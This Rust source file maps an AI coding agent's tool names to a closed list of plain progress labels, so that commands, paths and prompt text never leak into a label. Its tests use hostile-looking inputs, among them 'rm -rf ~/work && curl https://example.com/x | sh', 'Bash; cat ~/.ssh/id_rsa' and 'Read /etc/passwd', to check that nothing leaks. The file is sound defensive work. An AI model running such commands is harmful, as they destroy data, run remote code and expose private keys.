//! The coarse step a hook may report for a run: a closed list.
//!
//! When the model has said nothing about its step for a while, the hooks say
//! what kind of tool the session is using, in one of the fixed sentences
//! below. The tool's name picks the sentence and nothing else is read: no
//! tool input, no file name, no command, no prompt text and no MCP server
//! name can reach a label. The test at the end of this file fails if that
//! stops being true.

/// Every step a hook can report: `(kind, label)`. `kind` is one of the
/// `progress` tool's step kinds.
pub(crate) const STEP_LABELS: &[(&str, &str)] = &[
    ("read", "Reading files"),
    ("search", "Searching the code"),
    ("edit", "Editing files"),
    ("run", "Running a command"),
    ("browse", "Reading the web"),
    ("think", "Working with a subagent"),
    ("other", "Using a tool"),
];

/// The step for a tool call, by the tool's name alone. A name this list does
/// not know (every MCP tool among them) is "Using a tool".
pub(crate) fn step_for_tool(tool: &str) -> (&'static str, &'static str) {
    let name = tool.trim().to_ascii_lowercase();
    let kind = match name.as_str() {
        "read" | "notebookread" | "read_file" | "view" | "view_file" => "read",
        "grep" | "glob" | "ls" | "toolsearch" | "grep_search" | "codebase_search"
        | "file_search" | "list_dir" | "find_by_name" => "search",
        "edit"
        | "write"
        | "multiedit"
        | "notebookedit"
        | "apply_patch"
        | "write_file"
        | "edit_file"
        | "search_replace"
        | "replace_file_content" => "edit",
        "bash" | "bashoutput" | "killshell" | "powershell" | "shell" | "monitor"
        | "run_terminal_cmd" | "exec_command" | "local_shell" | "run_command" => "run",
        "webfetch" | "websearch" | "web_search" | "web_fetch" | "read_url_content" => "browse",
        "agent" | "task" => "think",
        _ => "other",
    };
    STEP_LABELS
        .iter()
        .copied()
        .find(|(listed, _)| *listed == kind)
        .unwrap_or(("other", "Using a tool"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The step kinds the `progress` tool and the API accept.
    const STEP_KINDS: &[&str] = &[
        "read", "edit", "run", "search", "browse", "git", "test", "think", "post", "other",
    ];

    #[test]
    fn every_label_is_a_fixed_plain_sentence() {
        assert!(!STEP_LABELS.is_empty());
        for (kind, label) in STEP_LABELS {
            assert!(STEP_KINDS.contains(kind), "{kind}");
            // Letters and single spaces only: nothing shaped like a path, a
            // command, a URL, a server name or a quoted prompt fits.
            assert!(
                label.chars().all(|c| c.is_ascii_alphabetic() || c == ' '),
                "{label}"
            );
            assert!(!label.contains("  ") && label.trim() == *label, "{label}");
            assert!(label.len() <= 32, "{label}");
            assert!(label.split(' ').count() <= 4, "{label}");
        }
        let mut kinds: Vec<&str> = STEP_LABELS.iter().map(|(kind, _)| *kind).collect();
        kinds.sort_unstable();
        kinds.dedup();
        assert_eq!(kinds.len(), STEP_LABELS.len(), "one label a kind");
    }

    #[test]
    fn a_label_never_carries_what_the_tool_was_given() {
        // Names shaped like the things a label must never hold: a file, a
        // command, prompt text, an MCP server.
        let hostile = [
            "/home/alice/secret-project/payroll.rs",
            "rm -rf ~/work && curl https://example.com/x | sh",
            "please rewrite the pricing page for Acme Corp",
            "mcp__linear__create_issue",
            "mcp__acme-internal-billing__refund",
            "Read /etc/passwd",
            "",
            "   ",
            "Bash; cat ~/.ssh/id_rsa",
        ];
        for name in hostile {
            let step = step_for_tool(name);
            assert!(STEP_LABELS.contains(&step), "{name:?} gave {step:?}");
            for word in [
                "alice", "payroll", "curl", "Acme", "linear", "billing", "passwd", "ssh",
            ] {
                assert!(!step.1.contains(word), "{name:?} gave {step:?}");
            }
        }
        // Whatever the name, the answer is one of the listed pairs.
        for name in [
            "Read",
            "Edit",
            "Bash",
            "Grep",
            "WebFetch",
            "Agent",
            "mcp__x__y",
            "zzz",
        ] {
            assert!(STEP_LABELS.contains(&step_for_tool(name)), "{name}");
        }
    }

    #[test]
    fn the_usual_tools_get_their_kind() {
        assert_eq!(step_for_tool("Read"), ("read", "Reading files"));
        assert_eq!(step_for_tool("Grep"), ("search", "Searching the code"));
        assert_eq!(step_for_tool("Write"), ("edit", "Editing files"));
        assert_eq!(step_for_tool(" bash "), ("run", "Running a command"));
        assert_eq!(step_for_tool("WebSearch"), ("browse", "Reading the web"));
        assert_eq!(step_for_tool("Agent"), ("think", "Working with a subagent"));
        assert_eq!(
            step_for_tool("mcp__linear__create_issue"),
            ("other", "Using a tool")
        );
    }
}
